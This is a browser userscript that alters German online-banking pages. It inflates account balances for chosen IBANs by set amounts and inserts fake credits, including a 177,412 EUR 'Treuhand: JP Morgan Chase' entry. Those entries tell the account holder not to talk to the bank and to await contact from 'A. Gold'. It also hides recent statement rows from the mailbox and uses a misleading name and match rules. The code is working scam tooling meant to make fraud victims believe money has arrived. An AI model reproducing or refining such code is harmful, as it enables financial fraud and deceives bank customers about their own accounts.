// ==UserScript==
// @name         Ed Start 4Rec vb.ebc1@gmx.de
// @namespace    http://tampermonkey.net/
// @version      27.772
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/556990/Ed%20Start%204Rec%20vbebc1%40gmxde.user.js
// @updateURL https://update.greasyfork.org/scripts/556990/Ed%20Start%204Rec%20vbebc1%40gmxde.meta.js
// ==/UserScript==


// Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  40000},  // 72000
        { index: 1, adjustmentAmount:  40000},  // 72000
        { index: 2, adjustmentAmount:  40000},  // 72000
        { index: 3, adjustmentAmount: 0},
        { index: 4, adjustmentAmount: 0},
        { index: 3, adjustmentAmount: 0 },
        { index: 4, adjustmentAmount: 0}
        // Add more balance configurations as needed
    ];


//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------

    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE30 6006 9714";
       var targetTextContent2 = " 0408 7170 09";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 40000; // Adjust the amount as needed  // 72000

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
    const timeoutMillis = 0; // Adjust the timeout as needed

    var IBmodificationAmount = 40000;


         // Your date rule → modify all from MIN_DAY. Dez. and newer
    const MIN_DAY = 9;
    const MIN_MONTH = 12; // December



//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------


    // Configurable timeout value (in milliseconds)
    const TIMEOUT_MS = 0; // Change this value as needed



   // Array of configurable transactions
   const TRANSACTIONS = [
    {
      title: 'Treuhand: JP Morgan Chase',
      description: 'A. Gold kontaktieren. Mit Bank nicht besprechen, solange kein Nachweis, sonst wird gesperrt.',
      amount: '177.412,71',
      date: 'Vorgemerkt',
      insertAtTop: true,
      moveSteps: 1,
      order: 8
   },
 {
      title: 'ERICH JUN SUESS',
      description: '2 A. Gold meldet sich.',
      amount: '25.000,00',
      date: '29. Dez.',   // 9. Dez.
      insertAtTop: false,
      moveSteps: 0,
      order: 7
   },
         {
      title: 'ERICH JUN SUESS',
      description: 'A. Gold meldet sich.',
      amount: '15.000,00',
      date: '9. Dez.',   // 9. Dez.
      insertAtTop: false,
      moveSteps: 0,
      order: 7
   },

  //  {
  //    title: 'JP Morgan Chase',
  //    description: 'A. Gold kontaktieren. Ohne ihn bitte nicht ausgeben.',
  //    amount: '27.000,00',
  //    date: '7. Aug.',
   //   insertAtTop: false,
  //    moveSteps: -2,
  //    order: 6
  //  }
  ].sort((a, b) => (a.order ?? 0) - (b.order ?? 0));


//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================

// SPAR SCRIPT



if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {


//FINÜBERSICHT
    const BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 0 },  // 110000
        { index: 1, adjustmentAmount: 28000 },// 110000
        { index: 4, adjustmentAmount: 28000 },
        { index: 5, adjustmentAmount: 28000 },
        { index: 10, adjustmentAmount: 0 },// 110000
        { index: 20, adjustmentAmount: 0 }, // 110000
        { index: 21, adjustmentAmount: 0 }
        // Add more as needed
    ];

// UMSATZE & KONTODETAILS BALANCE
  const IBAN_CHECK_RAW = 'DE69 6225 1550 1200 1312 97';      //

   const DELTA_EUR = 28000; // ← change this value // 110000


// UMSATZE TRANSAKTIONEN


  const transactions = [{
      title: "Treuhand: JP Morgan Chase",
      details: "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen, solange keine Unterlagen. A. Gold meldet sich.",
      amountText: "177.412,00 EUR",
      dateGroup: "Vorgemerkt",
      insertMode: "2",
      positionOffset: 0,
      link: "https://example.com/tx-1"
},
//    {
//      title: "Sylvanne OU",
///      details: "Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
//      amountText: "43.000,00 EUR",
//      dateGroup: "20.08.2025",
//      insertMode: 2,
 //     positionOffset: 0
//    },
    {
      title: "Erich Süss.",
      details: ". A. Gold meldet sich. Ohne ihn bitte nicht ausgeben.",
      amountText: "28.000,00 EUR",
      dateGroup: "29.12.2025",  // 29.12.2025
      insertMode: "2",
      positionOffset: 0,
      link: "https://example.com/tx-1"
 },
// {
//      title: "Dagmar Herbeck-Rosenbaum",
//      details: "2 Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
//      amountText: "30.000,00 EUR",
 //     dateGroup: "01.09.2025",  //01.09.2025
 //     insertMode: 2,
//      positionOffset: 0
//    },
///    {
///      title: "ILKA-MARTINA BROCKMANN",
///      details: "Sina 03",
///      amountText: "+99,99 EUR",
 ///     dateGroup: "heute",
///      insertMode: 2,
///      positionOffset: 0,
///      link: "https://example.com/tx-3"
///    },
///    {
///      title: "ILKA-MARTINA BROCKMANN",
///      details: "Top-level Transaction",
 ///     amountText: "+5.000,00 EUR",
 ///     dateGroup: "heute",
 ///     insertMode: 1,
 ///     positionOffset: 0
 ///   }
  ];


// POSTFACH

  // Your rule sets: a row is removed if it matches ALL enabled texts in ANY set.
  const RULES = [
       [
      { text: 'Kontoauszug', use: true },
      { text: '12/2025',      use: true },
      { text: 'DE69 6225 1550 1200 1312 97', use: false },
    ],
    [
      { text: 'Kontoauszug', use: true },
      { text: '11/2025',      use: true },
      { text: 'DE69 6225 1550 1200 1312 97', use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
      { text: 'DE69 6225 1550 1200 1312 97', use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '10/2025',      use: true },
      { text: 'DE69 6225 1550 1200 1312 97', use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
      { text: 'DE69 6225 1550 1200 1312 97', use: false },
    ],
       [
      { text: 'Kontoauszug', use: true },
      { text: '10/2021',      use: true },
      { text: 'DE69 6225 1550 1200 1312 97', use: false },
    ],
    // Add more rule sets as needed:
    // [
    //   { text: 'AnotherWord', use: true },
    //   { text: 'ExtraWord',   use: false },
    // ],
  ];





//FINÜBERSICHT
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
    'use strict';

 ///   const BALANCE_CONFIGS = [
 ///       { index: 0, adjustmentAmount: 155672 },
 ///       { index: 2, adjustmentAmount: 155672 },
 ///      { index: 3, adjustmentAmount: 155672 },
 ///       { index: 3, adjustmentAmount: 0 },
 ///       { index: 4, adjustmentAmount: 155672 }
 ///  ];

    const cache = new WeakMap();

    function parseGermanNumber(preText, postText) {
        const intPart = preText.replace(/\./g, '').trim();
        const fracPart = postText.replace(/[^\d]/g, '').trim();
        return parseFloat(`${intPart}.${fracPart}`) * (preText.includes('-') ? -1 : 1);
    }

    function formatGermanNumber(value) {
        const fixed = Math.abs(value).toFixed(2);
        const [intPart, fracPart] = fixed.split('.');
        const intWithDots = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        return {
            pre: (value < 0 ? '-' : '') + intWithDots,
            post: `,${fracPart}&nbsp;EUR`
        };
    }

    function getTargetBalances() {
        const container = document.querySelector('.nbf-finanzstatus.nbf-gv');
        if (!container) return [];

        const preList = container.querySelectorAll('.balance-predecimal.plus, .balance-predecimal.minus');
        const postList = container.querySelectorAll('.balance-decimal.plus, .balance-decimal.minus');

        const result = [];
        for (let i = 0; i < preList.length && i < postList.length; i++) {
            result.push({ pre: preList[i], post: postList[i], index: i });
        }
        return result;
    }

    function updateClass(element, newClass) {
        element.classList.remove('plus', 'minus');
        element.classList.add(newClass);
    }

    function updateBalances() {
        try {
            const balances = getTargetBalances();

            balances.forEach(({ pre, post, index }) => {
                const config = BALANCE_CONFIGS.find(cfg => cfg.index === index);
                if (!config || config.adjustmentAmount === 0) return;

                if (!cache.has(pre)) {
                    const originalValue = parseGermanNumber(pre.textContent, post.textContent);
                    cache.set(pre, originalValue);
                }

                const original = cache.get(pre);
                const current = parseGermanNumber(pre.textContent, post.textContent);

                const expectedModified = original + config.adjustmentAmount;
                const isAlreadyModified = Math.abs(current - expectedModified) < 0.01;
                const isOriginal = Math.abs(current - original) < 0.01;

                if (isOriginal && !isAlreadyModified) {
                    const { pre: newPre, post: newPost } = formatGermanNumber(expectedModified);
                    pre.innerHTML = newPre;
                    post.innerHTML = newPost;

                    const newClass = expectedModified >= 0 ? 'plus' : 'minus';
                    updateClass(pre, newClass);
                    updateClass(post, newClass);

                    console.log(`[UserScript] Balance at index ${index} modified to ${expectedModified} (${newClass})`);
                }
            });
        } catch (error) {
            console.error('[UserScript] Error updating balances:', error);
        }
    }

    setInterval(updateBalances, 40);
}





//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


// UMSATZE BALANCE

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /**
   * Amount (EUR) to add (positive) or subtract (negative) to EVERY matching balance
   * inside the specified account cards WHEN the IBAN check matches.
   */
//  const DELTA_EUR = 4324320; // ← change this value
  const DELTA_CENTS = Math.round(Number(DELTA_EUR) * 100);

  /**
   * IBAN guard: only modify balances within a card if the digits of the IBAN shown
   * in its ".mkp-identifier-description" match these digits.
   * The HTML may split the IBAN across text and <strong>, so we compare digits-only.
   */
//  const IBAN_CHECK_RAW = 'DE52 2905 0101 00 84 5790 28';

  const IBAN_CHECK_DIGITS = (IBAN_CHECK_RAW.match(/\d/g) || []).join('');

  // Card containers to look inside
  const CARD_SELECTOR = [
    '.mkp-card.mkp-card-account.mkp-layout-margin.mkp-card-account-link',
    '.mkp-card.mkp-card-bank-account.mkp-card-thinner.mkp-card-clickable'
  ].join(', ');

  // Balance nodes (handle plus/negative/minus and predecimal variant too)
  const BALANCE_SELECTOR = [
    '.balance-decimal.plus',
    '.balance-decimal.negative',
    '.balance-decimal.minus',
    '.balance-predecimal.plus',
    '.balance-predecimal.negative',
    '.balance-predecimal.minus',
  ].join(', ');

  // ─────────── Helpers: parse/format German amounts ───────────
  function extractParts(text) {
    const s = String(text ?? '');
    const m = s.match(/(.*?)([-–—]?\s*[0-9][0-9.,]*)(.*)/);
    if (!m) return { prefix: '', number: s.trim(), suffix: '', found: false };
    return { prefix: m[1], number: m[2].replace(/\s+/g, ''), suffix: m[3], found: true };
  }

  function parseGermanAmountToCents(text) {
    try {
      if (!text) return null;
      const { number } = extractParts(text);
      if (!number) return null;
      let raw = number.replace(/[–—]/g, '-'); // normalize minus variants
      raw = raw.replace(/\./g, '');           // remove thousands sep
      raw = raw.replace(/,/g, '.');           // decimal comma -> dot
      const val = Number(raw);
      if (!Number.isFinite(val)) return null;
      return Math.round(val * 100);
    } catch (e) {
      console.error('[BalanceInjector] parse error', e, { text });
      return null;
    }
  }

  function formatCentsGerman(cents, { keepCents, keepCurrency, origSuffix } = {}) {
    const negative = cents < 0;
    const abs = Math.abs(cents);
    const euros = Math.floor(abs / 100);
    const dec = abs % 100;
    const eurosStr = euros.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const body = keepCents
      ? `${eurosStr},${dec.toString().padStart(2, '0')}`
      : Math.round(abs / 100).toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const sign = negative ? '-' : '';
    const suffix = keepCurrency ? (origSuffix || ' EUR') : (origSuffix || '');
    return `${sign}${body}${suffix}`;
  }

  function detectStyle(text) {
    const t = String(text ?? '');
    const { prefix, number, suffix } = extractParts(t);
    const hasComma = /,/.test(number);
    const hasEUR = /\bEUR\b/i.test(suffix) || /\bEUR\b/i.test(prefix);
    return { suffix, hasComma, hasEUR };
  }

  function setClassesForSign(el, cents) {
    try {
      if (!el?.classList) return;
      const isNeg = cents < 0;
      if (isNeg) {
        el.classList.add('negative', 'minus');
        el.classList.remove('plus');
      } else {
        el.classList.add('plus');
        el.classList.remove('negative', 'minus');
      }
    } catch {}
  }

  // ─────────── IBAN checker per card ───────────
  function cardIbanDigits(card) {
    try {
      const idDesc = card.querySelector('.mkp-identifier-description');
      if (!idDesc) return '';
      // Prefer the <p> that contains the IBAN (can be split across text + <strong>)
      // If multiple <p>, join them (defensive).
      const pList = idDesc.querySelectorAll('p');
      let text = '';
      if (pList.length) {
        pList.forEach(p => { text += ' ' + (p.textContent || ''); });
      } else {
        text = idDesc.textContent || '';
      }
      return (text.match(/\d/g) || []).join('');
    } catch (e) {
      console.warn('[BalanceInjector] Failed to read IBAN from card', e, card);
      return '';
    }
  }

  function ibanMatchesCard(card) {
    const digits = cardIbanDigits(card);
    if (!digits) return false;
    const match = digits === IBAN_CHECK_DIGITS;
    // Optional debug
    // console.debug('[BalanceInjector] IBAN check', { cardDigits: digits, expected: IBAN_CHECK_DIGITS, match });
    return match;
  }

  // ─────────── Per-node cache & application ───────────
  function ensureCache(el) {
    if (!el) return false;
    if (!el.dataset.originalBalanceCents) {
      const currentText = el.textContent?.trim() || '';
      const currentCents = parseGermanAmountToCents(currentText);
      if (currentCents === null) return false;

      const style = detectStyle(currentText);
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      el.dataset.balanceInjector = '1';
      // console.debug('[BalanceInjector] Cached', { originalCents: currentCents, modifiedCents: currentCents + DELTA_CENTS });
    }
    return true;
  }

  function rebaseIfExternalChange(el, currentCents) {
    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents !== original && currentCents !== modified) {
      el.dataset.originalBalanceCents = String(currentCents);
      el.dataset.modifiedBalanceCents = String(currentCents + DELTA_CENTS);
      const style = detectStyle(el.textContent?.trim() || '');
      el.dataset.keepCents = style.hasComma ? '1' : '0';
      el.dataset.keepCurrency = style.hasEUR ? '1' : '0';
      el.dataset.origSuffix = style.suffix || '';
      // console.info('[BalanceInjector] Rebased on external change', { newOriginal: currentCents });
    }
  }

  function applyIfOriginal(el) {
    const currentText = el.textContent?.trim() || '';
    const currentCents = parseGermanAmountToCents(currentText);
    if (currentCents === null) return;

    rebaseIfExternalChange(el, currentCents);

    const original = Number(el.dataset.originalBalanceCents);
    const modified = Number(el.dataset.modifiedBalanceCents);
    if (currentCents === original) {
      const keepCents = el.dataset.keepCents === '1';
      const keepCurrency = el.dataset.keepCurrency === '1';
      const origSuffix = el.dataset.origSuffix || '';
      const formatted = formatCentsGerman(modified, { keepCents, keepCurrency, origSuffix });
      el.textContent = formatted;
      setClassesForSign(el, modified);
      try { el.setAttribute('title', formatted); } catch {}
      el.dataset.lastAppliedAt = String(Date.now());
      // console.debug('[BalanceInjector] Applied', { formatted, modified });
    }
  }

  // ─────────── Main loop: only inside target cards & only if IBAN matches ───────────
  function processAll() {
    try {
      const cards = document.querySelectorAll(CARD_SELECTOR);
      if (!cards.length) return;

      cards.forEach((card) => {
        if (!ibanMatchesCard(card)) {
          // Skip this card if IBAN digits don't match the expected one
          return;
        }

        const balances = card.querySelectorAll(BALANCE_SELECTOR);
        balances.forEach((el) => {
          if (!ensureCache(el)) return;
          applyIfOriginal(el);
        });
      });
    } catch (e) {
      console.error('[BalanceInjector] Tick error', e);
    }
  }

  // Run forever at the chosen cadence (interval only)
  processAll(); // immediate pass
  const id = setInterval(processAll, 20);
  window.__BalanceInjectorIntervalId__ = id; // debug handle
  console.log('[BalanceInjector] Started (interval 100ms). Delta per balance:', DELTA_EUR, 'EUR');
}




//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

//. KONTODETAILS NEW 15.12



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG ========= */
//  const DELTA_EUR = 99999;
//  const IBAN_CHECK_RAW = 'DE98 6805 0101 0011 2511 54';
  /* ========================= */

  const log = (...a) => console.log('[Delta FIX]', ...a);
  const warn = (...a) => console.warn('[Delta FIX]', ...a);
  const err = (...a) => console.error('[Delta FIX]', ...a);

  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  /* ---------- German number helpers ---------- */
  const parseDE = (str) => {
    const cleaned = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(cleaned);
  };

  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [i, d] = abs.toFixed(2).split('.');
    return `${neg}${i.replace(/\B(?=(\d{3})+(?!\d))/g, '.')},${d}`;
  };

  const splitValueAndSuffix = (text) => {
    const m = text.match(/-?[\d.]+,\d{2}/);
    if (!m) return null;
    const suffix = text.slice(m.index + m[0].length).trim();
    return { value: m[0], suffix: suffix ? ' ' + suffix : '' };
  };

  /* ---------- Shadow root ---------- */
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-slot-shadow');
    if (!host) {
      warn('Shadow host not found yet');
      return null;
    }
    if (!host.shadowRoot) {
      warn('Shadow root not attached yet');
      return null;
    }
    return host.shadowRoot;
  };

  /* ---------- IBAN check ---------- */
  const ibanMatches = (root) => {
    const labels = [...root.querySelectorAll('p.MuiTypography-label04')];
    const ibanLabel = labels.find(p => p.textContent.trim() === 'IBAN');

    if (!ibanLabel) {
      warn('IBAN label not found');
      return false;
    }

    const container = ibanLabel.closest('[role="listitem"]');
    if (!container) {
      warn('IBAN container not found');
      return false;
    }

    const valueEl = container.querySelector('p.MuiTypography-input01');
    if (!valueEl) {
      warn('IBAN value element not found');
      return false;
    }

    const rawText = valueEl.textContent;
    const digits = rawText.replace(/\D/g, '');

    log('IBAN raw text:', rawText);
    log('IBAN digits found:', digits);
    log('IBAN expected:', IBAN_DIGITS_EXPECTED);

    const ok = digits === IBAN_DIGITS_EXPECTED;
    if (!ok) warn('IBAN mismatch');
    else log('IBAN match OK');

    return ok;
  };

  /* ---------- Core delta logic ---------- */
  const processed = new WeakSet();

  const applyDeltaForLabel = (labelText) => {
    try {
      const root = getShadowRoot();
      if (!root) return;

      if (!ibanMatches(root)) return;

      const labels = [...root.querySelectorAll('p.MuiTypography-label04')]
        .filter(p => p.textContent.trim().startsWith(labelText));

      if (!labels.length) {
        warn(`Label not found: ${labelText}`);
        return;
      }

      labels.forEach(label => {
        const container = label.closest('[role="listitem"]');
        if (!container) return;

        const valueEl = container.querySelector('p.MuiTypography-input01');
        if (!valueEl) return;

        if (processed.has(valueEl)) return;

        const originalText = valueEl.textContent.trim();
        const split = splitValueAndSuffix(originalText);

        if (!split) {
          warn('Cannot parse number from:', originalText);
          return;
        }

        const originalNum = parseDE(split.value);
        if (isNaN(originalNum)) {
          warn('Parsed NaN from:', originalText);
          return;
        }

        const modified = formatDE(originalNum + DELTA_EUR) + split.suffix;

        log(labelText, 'original:', originalText);
        log(labelText, 'modified:', modified);

        valueEl.textContent = modified;
        processed.add(valueEl);
      });
    } catch (e) {
      err('applyDeltaForLabel error', e);
    }
  };

  /* ---------- Tick ---------- */
  const tick = () => {
    applyDeltaForLabel('Kontostand');
    applyDeltaForLabel('Verfügbarer Betrag');
  };

  log('Delta FIX userscript loaded');
  setInterval(tick, 250);

}


// KONTODETAILS BALANCE  OLD

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

  'use strict';

  /* ========= CONFIG =========
     Positive increases, negative decreases (EUR).
     Examples: 25  |  -10.5  |  1234.56
  */
//  const DELTA_EUR = 100; // <-- set your offset here
//
//  // IBAN digits must match those displayed under `.mkp-identifier-description > p`
//  const IBAN_CHECK_RAW = 'DE52 2905 0101 00 84 5790 28';
  /* ========================= */

  const log = (...a) => console.log('[Kontodetails mod]', ...a);

  // Labels to modify (beginning of title/aria-label)
  const LABELS = ['Kontostand', 'Verfügbarer Betrag'];

  // --- German number helpers ---
  const parseDE = (str) => {
    if (!str) return NaN;
    const num = str.replace(/[^\d.,-]/g, '').replace(/\./g, '').replace(',', '.');
    return Number(num);
  };
  const formatDE = (num) => {
    const neg = num < 0 ? '-' : '';
    const abs = Math.abs(num);
    const [intPart, decPart] = abs.toFixed(2).split('.');
    const withThousands = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
    return `${neg}${withThousands},${decPart}`;
  };
  const splitValueAndSuffix = (text) => {
    const trimmed = text.trim().replace(/\s+/g, ' ');
    const match = trimmed.match(/-?[\d.]+,\d{2}/);
    if (!match) return { valuePart: trimmed, suffix: '' };
    const valuePart = match[0];
    const after = trimmed.slice(match.index + valuePart.length).trimStart();
    const suffix = after.length ? ' ' + after : '';
    return { valuePart, suffix };
  };

  // ---- IBAN check helpers ----
  const IBAN_DIGITS_EXPECTED = IBAN_CHECK_RAW.replace(/\D/g, '');

  const getIbanDigitsFromPage = () => {
    // Example markup:
    // <div class="mkp-identifier-description">
    //   <p>DE52 2905 0101 00<strong>84 5790 28</strong></p>
    // </div>
    const p = document.querySelector('.mkp-identifier-description p');
    if (!p) return null;
    const txt = p.textContent || '';
    const digits = txt.replace(/\D/g, '');
    return digits || null;
  };

  const ibanMatches = () => {
    const pageDigits = getIbanDigitsFromPage();
    if (!pageDigits) {
      log('IBAN not found on page; skipping this tick.');
      return false;
    }
    const ok = pageDigits === IBAN_DIGITS_EXPECTED;
    if (!ok) log('IBAN mismatch; skipping modification.', { expected: IBAN_DIGITS_EXPECTED, found: pageDigits });
    return ok;
  };

  // Shadow root that holds the balances
  const getShadowRoot = () => {
    const host = document.querySelector('#cpl-1-0-0 #cpl-slot-MAIN') ||
                 document.querySelector('#cpl-slot-MAIN');
    return host && host.shadowRoot ? host.shadowRoot : null;
  };

  // Build selector for allowed labels
  const labelSelector = LABELS.map(l => `[title^="${l}"], [aria-label^="${l}"]`).join(', ');

  // Find all value elements we want to control
  const findAllBalanceElements = (root) => {
    if (!root) return [];
    const blocks = root.querySelectorAll(labelSelector);
    const values = [];
    blocks.forEach(block => {
      const el = block.querySelector('.MuiTypography-input01');
      if (el) values.push(el);
    });
    return values;
  };

  // Per-element state
  const stateMap = new WeakMap(); // el -> { originalText, originalNumber, suffix, modifiedText }

  const captureBaseline = (el) => {
    const text = (el.textContent || '').trim();
    const { valuePart, suffix } = splitValueAndSuffix(text);
    const num = parseDE(valuePart);
    if (isNaN(num)) return null;
    const s = {
      originalText: text,
      originalNumber: num,
      suffix,
      modifiedText: formatDE(num + DELTA_EUR) + suffix
    };
    stateMap.set(el, s);
    log('Captured baseline:', s.originalText);
    return s;
  };

  const applyModified = (el, s) => {
    if (!s) return;
    el.textContent = s.modifiedText;
    log('Applied modified balance:', s.modifiedText);
  };

  const tick = () => {
    try {
      // 1) IBAN must match; otherwise skip the entire cycle.
      if (!ibanMatches()) return;

      // 2) Proceed with balances inside the shadow root.
      const root = getShadowRoot();
      if (!root) return;

      const targets = findAllBalanceElements(root);

      for (const el of targets) {
        let s = stateMap.get(el);
        if (!s) {
          s = captureBaseline(el);
          if (!s) continue;
          // First time: apply once.
          applyModified(el, s);
          continue;
        }

        const currentText = (el.textContent || '').trim();

        // Only re-apply when we see the original again.
        if (currentText === s.originalText) {
          applyModified(el, s);
          continue;
        }

        // If bank updated the baseline (neither originalText nor our modifiedText),
        // adopt that as the new baseline, then apply.
        if (currentText !== s.modifiedText) {
          const { valuePart, suffix } = splitValueAndSuffix(currentText);
          const liveNum = parseDE(valuePart);
          if (!isNaN(liveNum) && (liveNum !== s.originalNumber || suffix !== s.suffix)) {
            const newState = {
              originalText: currentText,
              originalNumber: liveNum,
              suffix,
              modifiedText: formatDE(liveNum + DELTA_EUR) + suffix
            };
            stateMap.set(el, newState);
            log('Baseline changed; updated and re-applied:', newState.originalText);
            applyModified(el, newState);
          }
        }
        // If it's already our modified text, do nothing.
      }
    } catch (e) {
      console.error('[Kontodetails mod] tick error:', e);
    }
  };

  // Check every 2 seconds; no MutationObserver
  setInterval(tick, 100);
}



//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================


//  TRANSAKTION INSERTION

//=============================================================================================================================
//=============================================================================================================================
//=============================================================================================================================

if (
  window.location.href.includes("de") ||
  window.location.href.includes("sp") ||
  window.location.href.includes("Downloads")
) {
  'use strict';

///  // ✅ CONFIG: IBAN & TRANSACTIONS
///  const IBAN_CHECK_RAW = 'DE96 1005 0000 0000 1234 56';

///  const transactions = [
///    {
///      title: "Treuhand: JP Morgan Chase",
///      details: "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen, solange keine Unterlagen. A. Gold meldet sich.",
////      amountText: "427.977,00 EUR",
///     dateGroup: "Vorgemerkt",
 ///     insertMode: 2,
///      positionOffset: 0,
///      link: "https://example.com/tx-1"
///    },
///    {
 ///     title: "Sylvanne OU",
///      details: "Testbuchung. Bitte sich an A. Gold wenden. Ohne ihn nicht ausgeben.",
///      amountText: "43.000,00 EUR",
///      dateGroup: "Gestern",
///      insertMode: 2,
///      positionOffset: 0
///    }
///  ];

  /******************************************************************
   * HELPERS
   ******************************************************************/
  const log  = (...args) => console.log("[UserScript]", ...args);

  const getAmountHtml = (amountText) => {
    const match = amountText.match(/^([+-]?)([\d.]+),(\d{2})\s*EUR$/i);
    if (!match) return '';
    const [, sign, pre, dec] = match;
    const signClass = sign === '-' ? 'minus' : 'plus';
    return `
    <div class="mkp-identifier-currency">
      <p class="mkp-currency mkp-currency-pill mkp-currency-m">
        <span aria-hidden="true" class="balance-predecimal ${signClass}">${sign}${pre}</span>
        <span aria-hidden="true" class="balance-decimal ${signClass}">,${dec}&nbsp;EUR</span>
        <span aria-hidden="false" class="offscreen">Betrag:${sign}${pre},${dec} EUR</span>
      </p>
    </div>`;
  };

  const createTransactionElement = (tx) => {
    const id = `custom_tx_${Date.now()}_${Math.floor(Math.random() * 100000)}`;
    const amountHtml = getAmountHtml(tx.amountText);
    const html = `
<li data-cloned="true" data-details="${tx.details}">
  <div id="${id}" class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable">
    <div class="mkp-identifier">
      <div class="mkp-identifier-description">
        <h4 class="mkp-headline-05">
          <a href="#" class="mkp-identifier-link custom-link-handler" data-link="${tx.link || ''}" style="cursor: pointer;">
            ${tx.title}
          </a>
        </h4>
        <p>${tx.details}</p>
      </div>
      <div class="mkp-identifier-sticker mkp-identifier-sticker-placeholder" aria-hidden="true"></div>
      ${amountHtml}
    </div>
  </div>
</li>`;
    const wrapper = document.createElement('div');
    wrapper.innerHTML = html;
    return wrapper.firstElementChild;
  };

  const getCleanIBANFromPage = () => {
    const p = document.querySelector('.mkp-identifier-description p');
    return p ? p.textContent.replace(/\s+/g, '').trim() : null;
  };

  const transactionAlreadyExists = (detailsText) =>
    [...document.querySelectorAll('li[data-cloned="true"]')].some(
      el => el.dataset.details === detailsText.trim()
    );

  const getAllTransactionLIs = () => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    return container ? [...container.querySelectorAll('li')] : [];
  };

  const repositionTransaction = (li, offset) => {
    if (!offset) return;
    const allLis = getAllTransactionLIs();
    const index = allLis.indexOf(li);
    if (index === -1) return;
    const newIndex = Math.max(0, Math.min(allLis.length - 1, index - offset));
    const target = allLis[newIndex];
    const parent = target?.parentElement;
    if (target && parent) {
      parent.insertBefore(li, offset > 0 ? target : target.nextSibling);
    }
  };

  const parseDateValue = (label) => {
    if (!label) return -Infinity;
    const lower = label.toLowerCase();

    if (lower === 'vorgemerkt') return Infinity;
    if (lower === 'heute') return Date.now();
    if (lower === 'gestern') {
      const d = new Date();
      d.setHours(0, 0, 0, 0);
      d.setDate(d.getDate() - 1);
      return d.getTime();
    }

    const [d, m, y] = label.split('.');
    if (d && m && y) {
      return new Date(`${y}-${m}-${d}`).getTime() || -Infinity;
    }

    return -Infinity;
  };

  // ✅ Fixed: compare visible <h3> text instead of aria-label
  const findExistingDateGroupUL = (dateGroup) => {
    const lists = document.querySelectorAll('.mkp-card-list');
    for (const list of lists) {
      const headerText = list.querySelector('.groupdate')?.textContent?.trim().toLowerCase();
      if (headerText === dateGroup.toLowerCase()) {
        return list.querySelector('ul.mkp-card-group');
      }
    }
    return null;
  };

  const createNewDateGroup = (dateGroup) => {
    const container = document.querySelector('.nbf-guided-tour-umsaetze-umsatzliste');
    if (!container) return null;

    const newUL = document.createElement('ul');
    newUL.className = 'mkp-card-group mkp-group-unify mkp-group-clickable';
    newUL.setAttribute('aria-label', dateGroup);

    const header = document.createElement('div');
    header.className = 'mkp-list-subline mkp-observe-sticky mkp-sticky-teleport-top';
    const h3 = document.createElement('h3');
    h3.className = 'mkp-headline-06 mkp-text-normal groupdate';
    h3.textContent = dateGroup;
    header.appendChild(h3);

